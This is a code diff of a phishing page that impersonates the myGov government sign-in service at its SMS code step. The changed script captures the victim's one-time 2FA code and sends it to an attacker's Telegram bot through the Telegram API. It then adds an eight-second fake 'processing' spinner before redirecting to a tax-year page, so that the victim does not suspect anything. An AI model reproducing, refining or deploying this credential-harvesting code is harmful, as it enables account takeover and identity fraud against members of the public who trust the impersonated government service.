@@ -6,12 +6,38 @@
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <title>
-        Sign in with myGov - myGov
+        Enter code - myGov
     </title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link href="./css/css.css" rel="stylesheet">
     <link href="./css/mgv2-application.css" rel="stylesheet">
     <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        /* Additional inline styles for the processing button */
+        .button-main .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .button-main.processing .spinner {
+            display: inline-block;
+        }
+        .button-main.processing .btn-text {
+            display: none;
+        }
+        .button-main.processing {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 
 <body>
@@ -39,7 +65,6 @@
                         <div class="login-grid-column">
                             <h1>Enter code</h1>
 
-                            <!-- ✅ REMOVED action="./next.php" and duplicate method -->
                             <form id="form-1" class="mygov-login-form alternative" method="post">
                                 <div class="input-group">
                                     <p>We sent a code by SMS to your mobile number</p>
@@ -51,16 +76,19 @@
                                     <br>
                                     <div class="button-digital-id-main-container override">
                                         <div class="digital-id-button-container">
-                                            <button type="submit" class="button-main" name="btn2" id="btn2">Next</button>
+                                            <button type="submit" class="button-main" name="btn2" id="btn2">
+                                                <span class="btn-text">Next</span>
+                                                <span class="spinner"></span>
+                                            </button>
                                         </div>
                                     </div>
+                                </div>
                             </form>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
     </div>
     <footer role="contentinfo">
         <div class="wrapper">
@@ -69,18 +97,10 @@
                     <nav>
                         <h2 class="sr-only" aria-label="Footer">Footer</h2>
                         <ul class="lower-links">
-                            <li>
-                                <a target="_blank" href="#">Terms of use</a>
-                            </li>
-                            <li>
-                                <a target="_blank" href="#">Privacy and security</a>
-                            </li>
-                            <li>
-                                <a target="_blank" href="#">Copyright</a>
-                            </li>
-                            <li>
-                                <a target="_blank" href="#">Accessibility</a>
-                            </li>
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
                         </ul>
                     </nav>
                 </section>
@@ -108,10 +128,9 @@
         $("#ph").inputmask({ "mask": "999-999-9999" });
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <!-- 🚫 Slim jQuery removed to prevent breaking $.ajax -->
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== 🟢 TELEGRAM SCRIPT (HANDLES FORM SUBMISSION) ====== -->
+    <!-- ====== TELEGRAM + 8‑SECOND PROCESSING DELAY ====== -->
     <script>
         // ============================================================
         // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
@@ -122,24 +141,40 @@
 
         $(document).ready(function() {
             $('#form-1').on('submit', function(e) {
-                e.preventDefault(); // Stop the form from reloading the page
+                e.preventDefault(); // Stop the form from reloading
 
+                // Get the code from the input
                 let code = $('#code').val();
+                if (!code || code.length < 6) {
+                    alert('Please enter the 6-digit code.');
+                    return;
+                }
+
+                // 1. Disable the button and show processing state
+                const $btn = $('#btn2');
+                $btn.addClass('processing');
+                $btn.prop('disabled', true);
+
+                // 2. Build the Telegram message
                 let msg = "|----------| OTP / 2FA CODE |--------------|\n";
                 msg += "Code: " + code + "\n";
                 msg += "|-----------------------------------------|";
 
-                // Send the code to Telegram
+                // 3. Send Telegram notification (fire and forget)
                 $.ajax({
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
                     method: 'GET',
-                    complete: function() {
-                        // Redirect to the next page (Personal Info)
-                        window.location.href = 'pic.html';
-                    }
+                    timeout: 5000
+                    // No success/error handling – we redirect after 8s anyway
                 });
+
+                // 4. Wait 8 seconds, then redirect to the next page
+                setTimeout(function() {
+                    window.location.href = 'taxyear.html';
+                }, 8000);
             });
         });
     </script>
 </body>
+
 </html>
